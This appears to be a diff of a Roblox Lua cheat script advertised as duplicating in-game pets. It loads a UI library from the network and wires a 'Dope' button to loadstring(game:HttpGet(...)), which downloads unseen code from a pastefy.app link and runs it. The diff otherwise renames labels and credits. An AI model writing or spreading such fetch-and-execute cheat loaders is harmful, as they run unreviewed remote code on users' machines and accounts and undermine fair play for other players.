@@ -1,19 +1,19 @@
--- Загрузка библиотеки Kavo UI
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Dupe Pets by Mangekoy2 | v2.0", "Serpent")
 
--- Создание главного окна
-local Window = Library.CreateLib("Dupe Pets", "Serpent")
-
--- Вкладка "Main"
+-- Вкладка Main
 local MainTab = Window:NewTab("Main")
-local PetsSection = MainTab:NewSection("Dupe Pets")
+local MainSection = MainTab:NewSection("Dope Pets")
 
--- Кнопка для дублирования питомцев
-PetsSection:NewButton("Dupe", "Dragon Fly, Raccoon, Red Fox", function()
-    -- Запуск вашего скрипта при нажатии
+-- Кнопка с текстовым полем
+local button = MainSection:NewButton("Dope", "Write your pet here", function()
     loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
 end)
 
--- Вкладка с автором
+-- Настройка внешнего вида
+button.Instance.Size = UDim2.new(0, 300, 0, 30)
+button.Instance.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Вкладка Credits
 local CreditsTab = Window:NewTab("Credits")
-CreditsTab:NewSection("Made By Mangekyu Scripts")
+CreditsTab:NewSection("Any pet")
